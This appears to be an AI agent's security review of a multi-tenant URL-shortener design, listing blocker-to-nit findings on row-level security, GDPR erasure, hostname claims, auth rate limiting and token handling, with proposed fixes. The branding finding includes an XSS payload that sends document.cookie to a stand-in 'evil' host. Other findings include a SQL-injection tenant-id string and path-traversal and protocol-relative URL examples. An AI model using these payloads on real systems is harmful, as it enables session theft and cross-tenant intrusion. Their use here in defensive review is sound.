I read all 20 ADRs, all 18 contracts, the 5 stubs most load-bearing for the questions asked, `refinement.md`, `plan.md`, and the relevant STORY/TASK text. Findings below.

```yaml
verdict: changes-requested
findings:
  - severity: blocker
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/auth-tokens.md
    line: 87
    summary: >-
      The two @Public() invitation routes must read and write tenant-scoped RLS tables with no
      tenant context, and the design provides no sanctioned mechanism. There is no third escape
      today; there is a hole that will become one during Implement.
    failure_scenario: >-
      `GET /api/invitations/:token` and `POST /api/invitations/:token/accept` are @Public()
      (workspace-authorization.md:96, auth-tokens.md:87), so TenantTransactionInterceptor is
      skipped and `app.tenant_id` is unset. `invitations`, `invitation_workspaces` and
      `memberships` all carry FORCE RLS with the tenant_isolation policy
      (rls-policy-template.md:82-83), whose invariant 1 states any query with no context flag
      affects zero rows. `invitationRepository.findByToken` therefore returns null for every
      valid token, and the membership INSERT is rejected by WITH CHECK. Same for ADR-0015's
      `onUserCreated` invited branch (adr-0015:50-55), which runs inside Better Auth's handler
      mounted outside Nest. The tenant id can only be learned by reading the invitation, which
      needs the tenant id: the exact chicken-and-egg ADR-0002 solved for JWTs with the `tid`
      claim and did not solve here. TASK-021's implementer, blocked at Implement with a frozen
      contract, has two cheap exits: set `app.tenant_id` in the invitations module (fails
      TASK-056's grep, so more likely they add `invitations_public_read ON invitations USING
      (true)`, which lets any unauthenticated caller enumerate every tenant's pending
      invitations and their workspace/role grants), or widen the redirect escape. Either
      outcome makes SC-1's "exactly two exclusions" false, and the second is a live
      cross-tenant read by an unauthenticated attacker.
    required_change: >-
      Decide this in Design, not in TASK-021. Pin the invitation token construction in a
      contract: opaque tenant-routing prefix plus secret, e.g. `<tenantId>.<32 bytes
      crypto.randomBytes base64url>`, stored as a SHA-256 digest, compared with
      `timingSafeEqual`, with a stated expiry. Specify that the public handler parses the
      tenant id from the token, opens `withTenantTransaction(tenantIdFromToken, ...)`, and that
      **no statement inside that transaction may act on the tenant before the token digest is
      verified against the row** — the caller controls the tenant id, so token verification is
      the only thing standing between an anonymous request and full tenant write context.
      Apply the same treatment to the email-verification token. Add the resulting rule to
      `tenant-context.md` as the third sanctioned pattern (a tenant-id-bearing capability
      token), which is not a GC-5 escape because it still runs under `SET LOCAL app.tenant_id`.
      Note explicitly whether `onUserCreated`'s uninvited branch is expected to work by
      generating the tenant uuid in application code and calling
      `withTenantTransaction(newTenantId, ...)` — it does, and saying so prevents TASK-013
      inventing something else.

  - severity: blocker
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/tenant-scoped-tables.md
    line: 93
    summary: >-
      The GDPR erasure sequence is denied by its own policy set. As specified it deletes
      nothing, or deletes nothing while reporting success — and the residue check cannot catch
      the user-account half.
    failure_scenario: >-
      The eraser opens its own transaction setting only `app.privileged_erase`
      (tenant-scoped-tables.md:93-103, adr-0019:71-81). Step 1 is
      `SELECT user_id FROM tenant_memberships WHERE tenant_id = '<tenantId>'`. That table is
      under FORCE RLS; its tenant_isolation policy tests `app.tenant_id`, which is unset, and
      the erase policy is `FOR DELETE` only (adr-0003:74-80). The SELECT returns **zero rows**.
      `deletedUserIds` is empty, so step 3 `DELETE FROM "user" WHERE id = ANY($userIds)`
      deletes nobody: after a "completed" GDPR deletion every member's email, name, credential
      and session row survives in Better Auth's tables. `assertNoTenantResidue` iterates
      `authOwnedUserTables()` **for the collected user ids** (line 112-114), so with an empty
      list it asserts zero over an empty set and passes. Step 2 fails the same way: `tenants`
      has no privileged-erase policy — the template's policy is keyed on `tenant_id` and
      `tenants` carries `id` (rls-policy-template.md:78), and no `tenants`-specific erase
      policy is defined anywhere — so `DELETE FROM tenants` is denied and the cascade never
      runs. Net result for an owner who exercises their right to erasure: nothing is deleted,
      and AC-91 ("their login fails") is false. The implementer's cheapest repair is to also
      set `app.tenant_id` in the eraser, which fails TASK-056's grep assertion
      (isolation-coverage.md:94), so the second-cheapest is a permissive read policy.
    required_change: >-
      Fix the policy set and the sequence together, in ADR-0003 and rls-policy-template.md:
      (a) define `tenants_privileged_erase ON tenants FOR DELETE USING (id::text =
      current_setting('app.privileged_erase', true))` explicitly, since the generic template
      cannot apply to the cascade root; (b) either extend the per-table erase policy to
      `FOR ALL`/add a matching `FOR SELECT` policy on `app.privileged_erase`, or move step 1's
      user-id collection into the caller's ordinary tenant transaction and pass the ids in;
      (c) make `assertNoTenantResidue` re-derive the user ids from the database rather than
      trusting the (possibly empty) collected list, so a silent no-op fails loudly. Add an
      integration test that asserts a non-zero deleted-row count per table, not only zero
      residue — "zero rows before, zero rows after" is the failure mode here.

  - severity: blocker
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/redirect-resolution.md
    line: 40
    summary: >-
      Redirect host resolution has no domain-state gate and there is no reserved-hostname list,
      so any signed-up user can claim Shortkit's own hostnames and serve attacker-controlled
      redirects and HTML from them.
    failure_scenario: >-
      Anyone can sign up and is `owner` of their own tenant (adr-0015:50-53), so
      `workspace_admin` on their own workspace is self-granted. They `POST /api/domains
      {hostname: "<fly-app>.fly.dev"}` — or the apex/API hostname once registered. Nothing
      rejects it: `domainContract.hostname` is a bare `z.string()`
      (domain-provisioning.md:104-112) and no reserved-hostname list exists anywhere in the
      design, in contrast to the 16 reserved *slugs* of ADR-0006. The row is created in
      `pending_verification`. The redirect path's decision order (redirect-resolution.md:40-47)
      resolves the host by hostname alone, and the only permitted query shape is
      `SELECT ... FROM domains WHERE hostname = $1` (line 89) — **no `state` predicate**, and
      the `domains_redirect_read` policy has none either. From that moment
      `https://<fly-app>.fly.dev/<anything>` resolves against the attacker's domain row: every
      unmatched path on Shortkit's own API host 302s to a destination they control, and the
      branded-404 page renders their `logoUrl`/`brandColor` on Shortkit's origin. ADR-0006:53
      explicitly assumes the opposite ("fails hostname resolution, and returns the default
      404") but nothing enforces the assumption. The same gap gives dangling-DNS takeover: when
      a customer deletes a domain (`DELETE /api/domains/:id` removes the row,
      adr-0016:106-110) while their CNAME still points at Fly, the next attacker to claim that
      hostname serves their traffic, and neither DNS verification nor certificate state is
      consulted before serving.
    required_change: >-
      In `redirect-resolution.md`, add `AND state = 'active'` (or at minimum `state IN
      ('verified','provisioning','active')`) to the normative `domains` query shape and to
      `resolveHost`'s contract, and state that a host record is cached only for a domain in
      that state. In `domain-provisioning.md`, add a reserved-hostname list — the API host,
      the apex and its `www`, `*.fly.dev`, `*.vercel.app`, `localhost`, and any IP literal —
      rejected at `POST /api/domains`, plus a real hostname format constraint (RFC 1123 label
      regex, total length ≤ 253, IDNA-normalised before storage and before Redis keying),
      replacing the bare `z.string()`.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/adr-0013-better-auth-in-nestjs.md
    line: 39
    summary: >-
      Mounting Better Auth ahead of Nest removes every protection Nest provides from the
      unauthenticated credential surface: no rate limit and no request body size limit apply to
      `/api/auth/*`.
    failure_scenario: >-
      `server.all('/api/auth/{*splat}', toNodeHandler(auth))` is registered before
      `app.use(express.json({limit:'100kb'}))` and outside the Nest graph. `RateLimitGuard` is
      a Nest guard scoped to `POST/PATCH/PUT/DELETE` under the `/api` prefix and keyed by
      `tenantId` from `AuthGuard` (rate-limit.md:22-44), so it can neither see nor key a
      pre-auth request. Nothing else in the design throttles authentication. An unauthenticated
      attacker therefore gets: unlimited `POST /api/auth/sign-in/email` against
      `https://<app>.fly.dev` for credential stuffing; unlimited sign-up, each of which creates
      a tenant row and dispatches a verification email (Resend's 100/day cap is exhausted in
      seconds, so every legitimate signup and invitation silently fails —
      mail-sender.md:109 says the flow "otherwise succeeded"); and account enumeration from
      Better Auth's native error shapes, which the design deliberately leaves unmapped
      (error-envelope.md:93-96). Separately, because the body parser is registered after the
      mount, a `POST /api/auth/sign-up/email` with a multi-gigabyte body is read into memory by
      the auth handler with no cap, on the same single Fly machine that must never return 5xx
      to a visitor (GC-8).
    required_change: >-
      In ADR-0013's mount block, add an Express-level IP-keyed limiter and a body cap in front
      of `toNodeHandler` — e.g. `express.json({limit:'32kb'})` scoped to the auth mount plus a
      Redis-backed limiter reusing `redisClient` (per-IP and per-email, tighter on sign-in and
      sign-up than the 120/60s tenant limit), with the same local-bucket degradation ADR-0012
      already defines so there is one posture. Record in `rate-limit.md`'s Scope section that
      `/api/auth/*` is covered by that separate limiter rather than by `RateLimitGuard`;
      today the section reads as if the surface simply has no limit, which is what an
      implementer will build.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/adr-0003-rls-policy-template-and-roles.md
    line: 112
    summary: >-
      A third RLS-bypassing delete path exists and is neither enumerated nor policy-narrowed:
      `DELETE FROM tenants` is permitted under ordinary tenant context, and its cascade runs
      with row security bypassed across every tenant-scoped table.
    failure_scenario: >-
      `tenants` carries a `FOR ALL` policy `id = current_setting('app.tenant_id')`
      (rls-policy-template.md:78). `FOR ALL` includes DELETE, so any code inside an ordinary
      `withTenantTransaction` — that is, any authenticated request handler — can delete its own
      tenant row, and PostgreSQL runs the ON DELETE CASCADE with row security bypassed
      (stated as fact at tenant-scoped-tables.md:105). That single statement hard-deletes every
      `click_events` and `audit_entries` row for the tenant without ever setting
      `app.privileged_erase`, without passing through `privilegedTenantEraser`, and without
      appearing in `ISOLATION_EXCLUSIONS`. Amendment A-2's guarantee — "no tenant-facing
      interface may delete or mutate a click event" — is enforced only by "the absence of
      methods" (click-events.md:28-31), and AC-60's enumeration inspects the click
      interfaces, so a `TenantRepository.delete()` added by any later TASK destroys the audit
      trail and the append-only stream with nothing failing. It also falsifies two claims this
      design leans on: ADR-0003:112 ("reading `pg_policies` tells an auditor the complete set
      of ways data crosses a tenant boundary") and ADR-0003:117 ("the grep test makes a third
      escape a build failure"), since this path sets no new context flag and greps clean.
    required_change: >-
      Narrow the `tenants` policy to the statements ordinary tenant code actually needs —
      `FOR SELECT` and `FOR UPDATE` on `id = current_setting('app.tenant_id', true)::uuid` —
      and put DELETE exclusively behind the new `tenants_privileged_erase` policy required by
      the erasure finding above. Then state in ADR-0003 that the cascade is a deliberate,
      policy-gated bypass reachable only from the eraser, and record it in the Consequences
      section so the `pg_policies` completeness claim is true as written.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/branding.md
    line: 12
    summary: >-
      Branding values are stored raw and interpolated into a server-rendered HTML 404 with no
      output encoding and no URL scheme allowlist. Stored XSS on the redirect surface.
    failure_scenario: >-
      `logoUrl: z.string().url().max(2048)` validates by attempting `new URL()` and stores the
      **original** string, so `https://x/a"><script>fetch('//evil/'+document.cookie)</script>`
      passes validation intact. `renderNotFound(host)` returns `{ status: 404; body: string }`
      (redirect-resolution.md:36) — a string the design nowhere requires to be escaped, and
      branding.md:117 asks only for "an `<img>` with an explicit size and no script execution
      path" while acknowledging the value is attacker-controlled. A `workspace_admin` PATCHes
      that logoUrl; every anonymous visitor hitting an unknown slug on that workspace's
      hostname executes it. Impact is contained to the tenant's own hostname *only if* the
      preceding hostname finding is also fixed — as designed, a tenant can claim Shortkit's own
      hostname and the payload runs on the platform origin. `z.string().url()` also accepts
      `javascript:` and `data:` for `fallbackUrl`, which then becomes the verbatim `Location`
      of a 302 (redirect-resolution.md:52-55).
    required_change: >-
      Add to `branding.md`: all interpolated branding values are HTML-attribute-escaped by
      `renderNotFound`, which is the normative requirement rather than a rendering suggestion;
      `logoUrl` and `fallbackUrl` are constrained to `https:` (refine the zod schema to check
      `new URL(v).protocol === 'https:'` and store the parsed `href`, not the raw input); and
      the 404 response carries `Content-Security-Policy: default-src 'none'; img-src https:;
      style-src 'unsafe-inline'` in the response-header table of `redirect-resolution.md`.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/tenant-context.md
    line: 65
    summary: >-
      The frozen normative SQL for the tenancy boundary, `SET LOCAL app.tenant_id = $1`, is not
      executable in PostgreSQL. The natural workaround is string interpolation at the single
      most security-critical statement in the system.
    failure_scenario: >-
      PostgreSQL's `SET`/`SET LOCAL` does not accept bind parameters; `SET LOCAL app.tenant_id
      = $1` raises a syntax error at `$1`. The same construct is repeated in ADR-0002:42 and
      in the redirect and eraser sequences. TASK-005's implementer hits this on first run,
      and the shortest edit that makes the tests go green is
      `` SET LOCAL app.tenant_id = '${tenantId}' ``. `tenantId` arrives from the JWT `tid`
      claim with no format validation anywhere in `auth-tokens.md`'s eight verification steps,
      and for the invitation paths (finding 1) it would arrive from an unauthenticated URL
      segment. A `tid` of `x'; SET LOCAL app.tenant_id = <victim>; --` then executes inside the
      transaction that RLS depends on for every subsequent statement. Even without a reachable
      injection source today, an unparameterised statement at the tenancy boundary is a sink
      that later TASKs will feed.
    required_change: >-
      Replace the SQL in `tenant-context.md`, ADR-0002, `redirect-read.ts` and the eraser
      sequence with `SELECT set_config('app.tenant_id', $1, true)` — parameterised,
      transaction-local, identical semantics. Add to "What the implementer must guarantee":
      the tenant id is validated as a uuid before it reaches `withTenantTransaction`, and no
      context flag is ever set by string concatenation. Update the grep table in
      `isolation-coverage.md`, which still matches on the flag name and is unaffected.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/web-api-client.md
    line: 75
    summary: >-
      The BFF proxy builds its upstream URL by interpolating an unvalidated catch-all path and
      never asserts the resolved origin, so it can be induced to send the bearer token
      somewhere other than Fly.
    failure_scenario: >-
      The normative rule is `${API_BASE_URL}/api/${path}` where `path` is the decoded
      `[...path]` catch-all. Next.js decodes route params, so a browser request to
      `/api/bff/x/%2e%2e%2f%2e%2e%2f%2e%2e%2fhealth` yields a joined path containing `../`,
      which undici normalises — the proxy escapes the `/api` prefix it is supposed to be
      pinned to. If the implementer reaches for `new URL(path, API_BASE_URL)` instead of
      concatenation (a natural choice, and nothing in the contract forbids it), a path
      beginning `//evil.example/` resolves protocol-relative to `https://evil.example/` and the
      route handler attaches `Authorization: Bearer <sk_at>` to it — a 5-minute credential for
      the victim's tenant delivered to an attacker-chosen host by a same-origin request the
      victim's browser makes. The contract also does not set `redirect: 'manual'`, so a
      redirect response from upstream is followed by the proxy.
    required_change: >-
      In `web-api-client.md`'s proxy table, make the upstream URL construction normative and
      safe: reject any path segment that is empty, `.`, `..`, or contains `/` `\` `:` after
      decoding; join, then assert `resolved.origin === new URL(API_BASE_URL).origin` and 400
      otherwise; pass `redirect: 'manual'` on the upstream fetch. Add an invariant that the
      proxy never sends `Authorization` to any origin other than `API_BASE_URL`.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/click-events.md
    line: 41
    summary: >-
      `ip_hash` is derived from the leftmost `X-Forwarded-For` entry, which is fully
      attacker-controlled, permanently corrupting an append-only store.
    failure_scenario: >-
      "Normalisation takes the leftmost `X-Forwarded-For` entry, trimmed" (click-events.md:41,
      and normatively in the stub `normaliseClientIp`). On Fly the client-supplied XFF is
      preserved and the trustworthy value is the platform-appended rightmost hop or
      `Fly-Client-IP`. Any anonymous visitor sends `X-Forwarded-For: 203.0.113.7` and chooses
      their own `ip_hash`; the redirect path is deliberately exempt from all rate limiting
      (AC-86, rate-limit.md:41-44), so a single client can write unlimited rows attributing
      clicks to arbitrary distinct or identical "visitors". SC-6's stream is append-only by
      design and read by a later analytics initiative, so the corruption is permanent and
      undetectable downstream. The same field is exported to the tenant under GDPR
      (tenant-scoped-tables.md:73), so the export carries values the visitor supplied.
    required_change: >-
      Change the normative rule to the platform-trusted client IP (`Fly-Client-IP`, falling
      back to the rightmost XFF entry after the configured number of trusted hops), and state
      that the leftmost entry is never used. Also pin the `CLICK_IP_HASH_KEY` rotation posture:
      the HMAC key is per-deployment and never per-tenant, so an operator holding an export
      plus the key can confirm-by-guess a specific IP for their own tenant, and identical IPs
      correlate across tenants inside the same export set — say so explicitly, or salt the
      HMAC message with `tenant_id`, which removes cross-tenant correlation for one line of
      code.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/domain-provisioning.md
    line: 119
    summary: >-
      Global hostname uniqueness is enforced on unverified claims, so any account can
      permanently squat hostnames it does not own. The contract is stricter than the AC it
      cites.
    failure_scenario: >-
      AC-68 (STORY-014:19) conditions the conflict on the hostname being *already verified* on
      tenant B. The contract instead enforces `UNIQUE (hostname)` at creation
      (domain-provisioning.md:119-125), before any DNS proof, and no expiry or reclaim path
      exists for a claim that never verifies. An attacker signs up and POSTs the hostnames of
      every agency and prospect they can think of — 120 writes per minute per tenant is the
      only bound (rate-limit.md:12-13), roughly 172,000 a day. Every legitimate tenant who
      later tries to add their own domain gets a permanent 409 `hostname_already_claimed`, with
      no support path in `launch-core` and no way for the platform to tell a squat from a
      legitimate pending claim. The fixed message correctly hides *which* tenant holds it
      (AC-68), which also means the victim cannot be told anything actionable.
    required_change: >-
      Make the uniqueness constraint conditional on proof of ownership: a partial unique index
      over rows in `verified`/`provisioning`/`active`, with `pending_verification` and
      `verification_failed` claims allowed to coexist and expired after a stated TTL (say 7
      days) by the reconciler that already runs. First to *verify* wins, which is what AC-68
      says. Record the expiry in `domain-provisioning.md`'s state table as a transition.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/workspace-authorization.md
    line: 88
    summary: >-
      The normative "minimum role per surface" table has no row for mutating a *tenant* role,
      yet AC-31 requires that surface to exist. The implementer picks the gate, and the
      adjacent row says `workspace_admin`.
    failure_scenario: >-
      AC-31 (STORY-007:20) requires rejecting removal or demotion of the last tenant `owner`,
      so TASK-018 must ship a tenant-role mutation. Its Produces block lists only
      `PATCH /members/:id/role`, described as "role changes accept the full workspace role
      set", and the contract's table gates that at `workspace_admin`. Nothing in the frozen
      table covers tenant-role changes, while the table's own rule is "a TASK adding a route
      adds a row here in the same commit" — i.e. the implementer decides. The likely
      copy-paste gates tenant-role mutation at `workspace_admin`. A member invited to a single
      client workspace as `workspace_admin` then promotes themselves to tenant `owner` and
      calls `POST /api/gdpr/export` (owner-only, AC-105), receiving an NDJSON archive of every
      workspace, member identity, domain, link, audit entry and click event in the agency —
      then `POST /api/gdpr/delete`.
    required_change: >-
      Add the rows now, in the frozen table: tenant-role read/list, tenant-role mutation and
      tenant-member removal all require tenant `owner`, and a tenant `admin` may not grant or
      revoke `owner`. State that workspace-role and tenant-role mutation are distinct routes
      with distinct guards (`@RequireTenantRole('owner')` vs `@RequireWorkspaceRole`), so no
      single handler takes a role string spanning both enums.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/adr-0015-user-tenant-cardinality.md
    line: 52
    summary: >-
      Every invitee is attached to the inviting tenant as tenant `admin`, regardless of the
      workspace roles the invitation actually granted.
    failure_scenario: >-
      "With a token it attaches the user to the inviting tenant as `admin` and creates the
      named workspace memberships." An operator invites a freelancer as `viewer` on one client
      workspace — the refinement's stated flow is "invite a teammate scoped to two clients and
      no others". On accepting, that person holds tenant role `admin`, which
      workspace-authorization.md:92 gates `POST /api/workspaces` behind, plus any future
      tenant-level surface. They create workspaces inside the agency's tenant, and if the
      tenant-role-mutation gate above lands wrong they are one step from `owner`. The
      invitation UI never offered a tenant role and the operator has no way to see or revoke
      it: no surface in `launch-core` reads or writes tenant roles.
    required_change: >-
      An invitee must receive the *least* tenant privilege that lets them exist —
      Amendment A-1 fixes the tenant enum at `owner|admin`, so this needs Juano: either add a
      third tenant role (`member`, rank 0, granting nothing at tenant level) via a refinement
      amendment, or state in ADR-0015 that invitees get `admin` and explicitly re-gate every
      tenant-`admin` surface to `owner` so `admin` grants nothing today. **This one is not the
      architect's alone to close** — the role set is fixed by approved Amendment A-1 and a
      third role reopens the Refine gate.

  - severity: major
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/click-events.md
    line: 19
    summary: >-
      `user_agent` is stored and buffered unbounded on the one request path that is
      deliberately never rate-limited.
    failure_scenario: >-
      `user_agent text` with no length constraint, buffered in memory up to
      `CLICK_BUFFER_CAPACITY = 10_000` events (click-events.md:74-82) on a path AC-86
      guarantees is "never limited at any rate". An anonymous attacker sends valid redirects
      with a ~16 KB `User-Agent` (Node's default header cap) at a few hundred RPS: the buffer
      alone reaches ~160 MB of live heap on the single Fly machine that also serves every
      redirect, plus the same volume written to Neon each second. The failure mode is an OOM
      kill, which ADR-0010:86 confirms drops the buffered events, and which breaks GC-8's "no
      unresolvable request returns 5xx to a visitor" for every concurrent visitor.
    required_change: >-
      Cap `user_agent` at enqueue — truncate to 512 characters in `ClickEventBuffer.enqueue`
      and declare `user_agent varchar(512)` in the schema block — and add a byte-budget to the
      buffer alongside the event count so capacity is bounded in memory, not only in rows.

  - severity: minor
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/auth-tokens.md
    line: 42
    summary: >-
      The AuthGuard verification list is declared ordered and short-circuiting, but places the
      `@Public()` check at step 6 while claiming public routes skip steps 1 through 5.
    failure_scenario: >-
      An implementer copying this frozen block literally rejects every anonymous request with
      401 at step 1 before reaching the step-6 exemption. The anonymous redirect `GET /:slug`
      is `@Public()`, so a visitor gets 401 instead of a 302 or the branded 404 — GC-8 and
      SC-7 broken, and the invitation-accept route unreachable. The reverse reading, where a
      handler forgets `@Public()` and is silently treated as public, is the same ambiguity
      pointing the other way.
    required_change: >-
      Renumber: the `@Public()` check is step 0. Everything else follows only for
      authenticated routes. This block is copied verbatim by TASK-011 and read by TASK-056, so
      it has to be unambiguous before the gate freezes it.

  - severity: minor
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/contracts/redirect-cache.md
    line: 9
    summary: >-
      The Redis keyspace carries no environment namespace, on a single cost-constrained Upstash
      instance.
    failure_scenario: >-
      Keys are `hst:v1:{hostname}`, `rdr:v1:{hostname}:{slug}`, `rl:v1:{tenantId}:{window}`,
      `revoked:jti:{jti}`, `domain:work`. GC-3 pushes toward one paid Upstash instance; the
      moment staging or a CI integration run shares it, a staging `hst:v1:links.client.example`
      record — carrying a staging `tenantId` and `domainId` — is read by production and serves
      real visitors a redirect resolved against the wrong tenant's data, or a `MISS` sentinel
      that 404s a live customer link for 300 seconds. `domain:work` is a single shared ZSET
      across environments.
    required_change: >-
      Prefix every key with an environment segment (`sk:{env}:...`) in the normative key block,
      and state that CI and local development must not point at the production instance.

  - severity: minor
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/design/adr-0018-ci-performance-gate.md
    line: 1
    summary: >-
      No dependency-audit step, no lockfile policy, and no version pinning anywhere in the
      design, for a stack that puts a young auth library on the critical path.
    failure_scenario: >-
      Grepping the design, plan, TASK-001 and TASK-002 for `audit`, `dependabot`, `cve`,
      `lockfile` or `frozen-lockfile` returns nothing. A transitive advisory in Better Auth,
      ioredis or the Next/Nest trees lands with no signal, and CI installs without
      `--frozen-lockfile`, so a resolution can drift between the tested tree and the deployed
      one.
    required_change: >-
      Add to ADR-0018's CI job table: `pnpm install --frozen-lockfile` in every job, and
      `pnpm audit --prod --audit-level high` in the `quality` job. Pin `better-auth` to an
      exact version in `package.json` rather than a caret range, given ADR-0013 already accepts
      that its releases break the hand-written mount.

  - severity: nit
    kind: design
    file: /home/juano/Workspaces/JustJuanoDev/.sdlc/foundation/plan.md
    line: 32
    summary: >-
      GC-9's "no PII in log bodies" has no enforcing artifact, and no ADR or contract covers the
      logger, CORS, or security headers.
    failure_scenario: >-
      Twenty ADRs and eighteen contracts contain no mention of pino configuration, redaction
      paths, CORS, or security headers. The first implementer to log a request object logs the
      `Authorization` header and `Cookie`, and nothing in the frozen artifacts contradicts
      them. NestJS's CORS-off default happens to be correct for the BFF topology, but it is a
      default nobody wrote down, so the first frontend TASK that hits a cross-origin error
      "fixes" it with `app.enableCors({origin:true, credentials:true})`.
    required_change: >-
      One short contract or an ADR addendum pinning: pino `redact` paths
      (`req.headers.authorization`, `req.headers.cookie`, `res.headers["set-cookie"]`,
      `*.password`, `*.token`, `*.ipHash` if desired); CORS stays disabled on the API, with the
      reason (the BFF is same-origin, the future MCP server will need its own decision); and
      `helmet` defaults plus HSTS on the API. Cheap now, three TASK reworks later.
```

## Notes

**On the two GC-5 exclusions, which is what you asked me to attack hardest.** Both are genuinely well-narrowed *as policies*. The redirect escape is `FOR SELECT`, on two tables, inside `SET TRANSACTION READ ONLY`, in one grep-asserted file — I could not find a way to reach it from a path that should not have it, and the branding port correctly avoids widening it to `workspaces` (ADR-0011's rejected alternative is the right call). Click emission (ADR-0010) is genuinely not an escape: `tenantId` rides in the cached link record and the flusher groups by tenant before opening `withTenantTransaction`. The ADR-0016 reconciler is genuinely not an escape either: the queue is a Redis ZSET of `"{tenantId}:{domainId}"` pairs and every Postgres touch is tenant-scoped. The Better Auth `user` table not being tenant-scoped is correctly argued in ADR-0003 and ADR-0015. On those five, the design holds.

What does not hold is the *accounting*. SC-1's claim is "exactly two", and I found one unenumerated bypass that exists today (the `tenants` cascade, finding 5) and one place where the design is short an escape it needs and does not have (the public invitation paths, finding 1). The grep-plus-length-assertion mechanism catches a third escape only if the third escape sets a new Postgres context flag; it does not catch a cascade, and it does not catch a permissive policy added to an existing table. Consider adding to TASK-056 a `pg_policies` assertion — every policy on every tenant-scoped table must match one of the three approved shapes by name and by `qual` text — which closes both of those holes with the mechanism already being built.

**On the revocation denylist, which you asked about specifically.** It is tenant-safe: `revoked:jti:{jti}` is keyed on an opaque unique token id, holds no tenant data, and cannot be poisoned across tenants. The 300-second replay window with Redis down is bounded, stated, and I would accept it. The related gap worth recording is that erasure and membership removal do not revoke outstanding tokens either — a user whose tenant was just erased keeps a valid JWT for up to 300 seconds, and every query it makes returns zero rows because the tenant's data is gone. That degrades correctly. Roles are deliberately not in the token (AC-30), which is the right call and makes role revocation immediate.

**On enumeration and the 404-not-403 rule.** The contracts do preserve it: `workspace-authorization.md`'s status table puts 404 before 403 explicitly, `error-envelope.md` invariant 6 states that absence of membership is `not_found` and only a too-low role is 403, and the Form B pattern loads through a tenant-scoped repository first so RLS produces the 404 before any role check runs. That is correctly designed. The residual leak is timing, not status: Form B does a database read before returning 404 while a cross-tenant id returns after the same read, so the two are indistinguishable — good. `hostname_already_claimed` has a fixed message and does not name the holder. I have no finding here beyond the squatting one.

**On short codes.** 7 characters over 57 symbols with `crypto.randomInt` rejection sampling is sound: ~1.95e12 per domain, no ordering leak, no volume leak, and the negative cache absorbs a scan. `SLUG_MIN_LENGTH = 1` applies only to operator-chosen custom slugs, which is their own risk to take. The domain `verification_token` (32 bytes `crypto.randomBytes`, base64url) is correctly specified. The contrast with the invitation and email-verification tokens — which have no specified construction anywhere in the design — is what makes finding 1's token half a real gap rather than a nit.

**On availability as a security property.** ADR-0012's degraded limiter is N× with N machines, correctly documented, and Fly runs one machine, so it is 1× today; I would not block on it. The more exploitable availability paths are the two I filed: unthrottled `/api/auth/*` and the unbounded `user_agent` on an unlimited path. ADR-0016's non-durable queue is a correctness/SC-4 gap rather than a security one — the worst an attacker does is flush Redis, which they cannot.

**Not filed, deliberately.** `Referrer-Policy: unsafe-url` on the 302 leaks the short URL to the destination; that is the point of an attribution referrer and the shortlink is public. The redirect service is an open redirect by definition. `sk_rt` on a `*.vercel.app` host-only cookie is fine (the PSL prevents a domain-scoped cookie). NestJS's CORS-off default is safe as a default. The eraser opening a second transaction while the request's own tenant transaction is still open consumes two pooled connections and will surface as an FK error rather than a leak — a correctness note for TASK-054, not a security finding.

## Dependencies reviewed

No lockfile or manifest exists yet, so I reviewed posture only, not versions or CVEs — I could not check any dependency against an advisory database because there is nothing to check.

| Dependency | Posture for this use |
|---|---|
| Better Auth | In the critical auth path, hand-mounted, with ADR-0013 explicitly accepting that a signature change breaks the build. Pin exactly; do not float a caret range. |
| Drizzle + drizzle-kit | Fine. Parameterises queries; ADR-0004's `-merge` gitattributes handling of the journal is the right call. |
| ioredis | Fine and appropriate; the option set in ADR-0012 is well-argued against specific ACs. |
| unplugin-swc | Dev-only, test-time. No production surface. |
| Resend | Fine. Credential is a single env var, absent in test, enforced twice. |
| @nestjs/schedule | Fine. In-process, no network surface of its own. |
| vitest 3 | Dev-only. |

Nothing here has a posture I would call problematic on its own. The supply-chain finding is the absence of a lockfile policy and an audit step, not any single package.

**Verdict: `changes-requested`** — 3 blockers, 10 majors, 3 minors, 1 nit. Finding 12 (invitee tenant role) is bounded by approved Amendment A-1 and escalates to Juano rather than being the architect's to close alone.